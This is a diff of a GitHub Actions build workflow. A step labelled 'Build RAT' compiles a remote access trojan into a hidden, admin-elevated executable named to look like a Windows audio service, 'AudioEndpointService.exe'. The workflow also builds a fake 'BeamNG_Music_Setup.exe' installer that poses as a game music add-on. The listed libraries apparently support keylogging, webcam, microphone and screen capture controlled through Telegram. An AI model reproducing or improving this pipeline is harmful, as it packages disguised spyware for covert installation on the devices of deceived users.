@@ -18,18 +18,22 @@ jobs:
     
     - name: Install dependencies
       run: |
-        pip install pyinstaller python-telegram-bot pillow opencv-python pynput cryptography pywin32 pyaudio requests psutil wmi pyautogui numpy
-    
+        python -m pip install --upgrade pip
+        pip install pyinstaller
+        pip install python-telegram-bot pillow opencv-python pynput cryptography pywin32 pyaudio requests psutil wmi pyautogui numpy
+        pip install --no-cache-dir --force-reinstall python-telegram-bot
+
     - name: Build RAT
       run: |
-        pyinstaller --onefile --noconsole --uac-admin tat.py --name AudioEndpointService.exe
-    
+        pyinstaller --onefile --noconsole --hidden-import=python_telegram_bot --hidden-import=telegram --hidden-import=requests --hidden-import=pillow --hidden-import=cv2 --uac-admin tat.py --name AudioEndpointService.exe
+
     - name: Build Setup
       run: |
         pyinstaller --onefile --noconsole --uac-admin setup_installer.py --name BeamNG_Music_Setup.exe
-    
+
     - name: Upload artifacts
       uses: actions/upload-artifact@v4
       with:
         name: beamng-rat
         path: dist/*.exe
+        compression-level: 0
